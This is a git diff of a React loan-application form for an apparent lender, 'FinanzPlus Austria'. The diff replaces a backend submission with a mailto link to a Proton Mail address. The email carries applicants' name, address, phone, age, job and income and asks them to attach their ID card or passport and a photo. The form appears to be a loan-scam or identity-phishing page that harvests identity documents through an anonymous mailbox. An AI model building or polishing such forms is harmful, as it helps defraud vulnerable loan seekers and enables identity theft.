@@ -19,7 +19,6 @@ function App() {
   });
 
   const [errors, setErrors] = useState({});
-  const [isSubmitting, setIsSubmitting] = useState(false);
   const [submitStatus, setSubmitStatus] = useState(null);
 
   // Gestion des changements de champs texte
@@ -106,7 +105,7 @@ function App() {
   };
 
   // Soumission du formulaire
-  const handleSubmit = async (e) => {
+  const handleSubmit = (e) => {
     e.preventDefault();
 
     if (!validateForm()) {
@@ -117,68 +116,76 @@ function App() {
       return;
     }
 
-    setIsSubmitting(true);
-    setSubmitStatus(null);
+    // Créer le corps de l'email avec toutes les informations
+    const emailBody = `
+DEMANDE DE PRÊT FINANZPLUS AUSTRIA
+=====================================
 
-    try {
-      const formDataToSend = new FormData();
+INFORMATIONS PERSONNELLES
+-------------------------
+Nom: ${formData.nom}
+Prénom: ${formData.prenom}
+Âge: ${formData.age} ans
+Adresse: ${formData.adresse}
+
+COORDONNÉES
+-----------
+Numéro de téléphone: ${formData.telephone}
+
+INFORMATIONS PROFESSIONNELLES
+-----------------------------
+Travail/Profession: ${formData.travail}
+Revenu mensuel: ${formData.revenuMensuel} €
+
+DOCUMENTS
+---------
+⚠️ IMPORTANT: Veuillez attacher les documents suivants à cet email:
+- Carte d'identité / Passeport (${files.identityDocument ? files.identityDocument.name : 'Non fourni'})
+- Photographie d'identité (${files.photo ? files.photo.name : 'Non fourni'})
+
+CONSENTEMENT
+------------
+✓ J'accepte les conditions d'éligibilité
+
+=====================================
+Date de soumission: ${new Date().toLocaleString('fr-FR')}
+    `.trim();
+
+    // Créer le lien mailto avec le sujet et le corps
+    const subject = encodeURIComponent('Demande de prêt FinanzPlus Austria');
+    const body = encodeURIComponent(emailBody);
+    const mailtoLink = `mailto:kontakt_finanzplusaustria@proton.me?subject=${subject}&body=${body}`;
+
+    // Ouvrir le client email
+    window.location.href = mailtoLink;
+
+    // Afficher un message de succès
+    setSubmitStatus({
+      type: 'success',
+      message: 'Votre client email va s\'ouvrir. N\'oubliez pas d\'attacher les documents (carte d\'identité et photo) avant d\'envoyer !'
+    });
+
+    // Réinitialiser le formulaire après 3 secondes
+    setTimeout(() => {
+      setFormData({
+        nom: '',
+        prenom: '',
+        age: '',
+        adresse: '',
+        telephone: '',
+        travail: '',
+        revenuMensuel: '',
+        accepteConditions: false
+      });
+      setFiles({
+        identityDocument: null,
+        photo: null
+      });
       
-      // Ajouter les données du formulaire
-      Object.keys(formData).forEach(key => {
-        formDataToSend.append(key, formData[key]);
-      });
-
-      // Ajouter les fichiers
-      formDataToSend.append('identityDocument', files.identityDocument);
-      formDataToSend.append('photo', files.photo);
-
-      const apiUrl = process.env.REACT_APP_API_URL || (process.env.NODE_ENV === 'production' ? '' : 'http://localhost:5000');
-      const response = await fetch(`${apiUrl}/api/submit-application`, {
-        method: 'POST',
-        body: formDataToSend
-      });
-
-      const data = await response.json();
-
-      if (response.ok && data.success) {
-        setSubmitStatus({
-          type: 'success',
-          message: data.message
-        });
-
-        // Réinitialiser le formulaire
-        setFormData({
-          nom: '',
-          prenom: '',
-          age: '',
-          adresse: '',
-          telephone: '',
-          travail: '',
-          revenuMensuel: '',
-          accepteConditions: false
-        });
-        setFiles({
-          identityDocument: null,
-          photo: null
-        });
-        
-        // Réinitialiser les inputs de fichiers
-        document.getElementById('identityDocument').value = '';
-        document.getElementById('photo').value = '';
-      } else {
-        setSubmitStatus({
-          type: 'error',
-          message: data.message || 'Bei der Übermittlung ist ein Fehler aufgetreten'
-        });
-      }
-    } catch (error) {
-      setSubmitStatus({
-        type: 'error',
-        message: 'Verbindungsfehler zum Server. Bitte überprüfen Sie, ob das Backend gestartet ist.'
-      });
-    } finally {
-      setIsSubmitting(false);
-    }
+      // Réinitialiser les inputs de fichiers
+      document.getElementById('identityDocument').value = '';
+      document.getElementById('photo').value = '';
+    }, 3000);
   };
 
   return (
@@ -405,9 +412,9 @@ function App() {
             <button
               type="submit"
               className="submit-button"
-              disabled={!formData.accepteConditions || isSubmitting}
+              disabled={!formData.accepteConditions}
             >
-              {isSubmitting ? 'Wird gesendet...' : 'Antrag einreichen'}
+              Antrag einreichen
             </button>
             <p className="submit-note">
               * Pflichtfelder
